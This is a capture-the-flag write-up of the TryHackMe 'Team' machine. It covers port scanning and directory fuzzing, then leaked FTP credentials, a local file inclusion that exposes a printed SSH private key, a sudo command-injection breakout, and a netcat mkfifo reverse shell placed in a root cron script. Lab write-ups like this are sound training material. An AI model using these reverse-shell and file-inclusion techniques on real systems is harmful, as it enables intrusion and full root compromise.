Quick port scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.101.54      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 14:17 EEST
Nmap scan report for 10.10.101.54
Host is up (0.35s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,22,80 -sC -sV 10.10.101.54         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 14:17 EEST
Nmap scan report for 10.10.101.54
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:d0:a9:64:78:1e:00:52:ac:f4:b3:14:22:ee:e8:37 (RSA)
|   256 51:e2:ea:34:df:32:aa:a3:7f:e7:5a:38:68:fe:3a:45 (ECDSA)
|_  256 af:3e:14:91:2e:de:63:4e:fe:6c:ac:5b:ee:c8:16:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds
```
So there is ssh, ftp and a website. Pretty simple

The website lead us to apache website and there it told us to add team.thm to the /etc/hosts

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://team.thm -t 100 -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess.php        (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.html       (Status: 403) [Size: 273]
/.htpasswd.html       (Status: 403) [Size: 273]
/.htpasswd.php        (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/index.html           (Status: 200) [Size: 2966]
/robots.txt           (Status: 200) [Size: 5]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]
Progress: 61407 / 61410 (100.00%)
```

There was the string "dale" inside the robots.txt file. Im quessing its a username. Ill try to use it to bruteforce the ftp
That didn't work. I found a script.txt

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
If the old "script" had the credentials we have to find it. I bruteforced for it.

```bash
 ffuf -u http://team.thm/scripts/script.FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/extensions-skipfish.fuzz.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://team.thm/scripts/script.FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/extensions-skipfish.fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

old                     [Status: 200, Size: 466, Words: 27, Lines: 19, Duration: 211ms]
txt                     [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 212ms]
```

```bash
cat script.old   
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```
Lets log into the ssh with ftpsuer:T3@m$h@r3

```bash
cat New_site.txt 
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 

```
The site seems to have a url injection. 
```bash
http://dev.team.thm/script.php?page=teamshare.php
```

I thought there was no LFI (local file inclusion) but i just had to remove the ../../../ and it worked. 

Now we just have to find something important since the /etc/passwd file doesnt rly give us anything useful
So we have to bruteforce and see what things we are able to see. Since every search gives us a status code of 200 we have to find a way to filter them. I just decided the filter out the ones with less than 1 words in them. Since after manually checking most of them were empty.

```bash
ffuf -u "http://dev.team.thm/script.php?page=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI_simple.txt -fw 0,1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.team.thm/script.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI_simple.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 0,1
________________________________________________

/etc/fstab              [Status: 200, Size: 424, Words: 62, Lines: 11, Duration: 252ms]
/etc/hosts.allow        [Status: 200, Size: 412, Words: 82, Lines: 12, Duration: 253ms]
/etc/issue              [Status: 200, Size: 27, Words: 5, Lines: 4, Duration: 253ms]
/etc/lsb-release        [Status: 200, Size: 105, Words: 3, Lines: 6, Duration: 232ms]
/etc/mtab               [Status: 200, Size: 3319, Words: 216, Lines: 45, Duration: 230ms]
/etc/network/interfaces [Status: 200, Size: 91, Words: 13, Lines: 6, Duration: 254ms]
/etc/networks           [Status: 200, Size: 92, Words: 11, Lines: 4, Duration: 255ms]
/etc/passwd             [Status: 200, Size: 2203, Words: 18, Lines: 43, Duration: 254ms]
/etc/profile            [Status: 200, Size: 582, Words: 145, Lines: 29, Duration: 488ms]
/etc/resolv.conf        [Status: 200, Size: 752, Words: 99, Lines: 21, Duration: 267ms]
/etc/passwd             [Status: 200, Size: 2203, Words: 18, Lines: 43, Duration: 1735ms]
/etc/ssh/sshd_config    [Status: 200, Size: 6013, Words: 305, Lines: 170, Duration: 239ms]
/etc/hosts.deny         [Status: 200, Size: 712, Words: 128, Lines: 19, Duration: 1736ms]
/etc/ssh/ssh_config     [Status: 200, Size: 1604, Words: 245, Lines: 54, Duration: 239ms]
/proc/cpuinfo           [Status: 200, Size: 2183, Words: 271, Lines: 58, Duration: 251ms]
/etc/vsftpd.conf        [Status: 200, Size: 5937, Words: 806, Lines: 161, Duration: 251ms]
/proc/interrupts        [Status: 200, Size: 1911, Words: 902, Lines: 37, Duration: 324ms]
/proc/ioports           [Status: 200, Size: 555, Words: 106, Lines: 25, Duration: 231ms]
/proc/version           [Status: 200, Size: 195, Words: 23, Lines: 3, Duration: 245ms]
/proc/mounts            [Status: 200, Size: 3319, Words: 216, Lines: 45, Duration: 245ms]
/proc/swaps             [Status: 200, Size: 104, Words: 32, Lines: 4, Duration: 245ms]
/proc/self/net/arp      [Status: 200, Size: 157, Words: 79, Lines: 4, Duration: 249ms]
/proc/meminfo           [Status: 200, Size: 1420, Words: 492, Lines: 53, Duration: 249ms]
/proc/stat              [Status: 200, Size: 1152, Words: 489, Lines: 12, Duration: 249ms]
/proc/modules           [Status: 200, Size: 3837, Words: 366, Lines: 75, Duration: 249ms]
/var/log/dmesg          [Status: 200, Size: 44616, Words: 6869, Lines: 589, Duration: 240ms]
/var/log/lastlog        [Status: 200, Size: 293461, Words: 2, Lines: 6, Duration: 237ms]
/etc/hosts              [Status: 200, Size: 185, Words: 19, Lines: 9, Duration: 3738ms]
/var/log/wtmp           [Status: 200, Size: 84481, Words: 2, Lines: 18, Duration: 237ms]
/etc/crontab            [Status: 200, Size: 721, Words: 103, Lines: 16, Duration: 4811ms]
/etc/apache2/apache2.conf [Status: 200, Size: 7313, Words: 944, Lines: 231, Duration: 4811ms]
:: Progress: [257/257] :: Job [1/1] :: 65 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```


```bash
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Great. Now we just change the permissions of the id_rsa file and we are able to log into ssh with dale.

There was an interesting file that didn't do much but we were able to run it as another user and break out of it and gain a shell as that user.

```bash
dale@ip-10-10-198-204:/home/gyles$ sudo -u gyles admin_checks
[sudo] password for dale: 
dale@ip-10-10-198-204:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: /bin/bash
Enter 'date' to timestamp the file: /bin/bash
The Date is whoami
gyles
```

```bash
You can write script: /usr/local/bin/main_backup.sh
```

It was writeable and since it was ran by crontab and root i just had to put a revshell inside and wait for it to be ran and I got a root shell.

```bash
gyles@ip-10-10-198-204:/usr/local/bin$ cat main_backup.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.25.159 4444 >/tmp/f



nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.198.204] 59034
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),108(lxd),1004(admin)
# cat /root/root.txt
THM{fhqbznavfonq}
# 
```

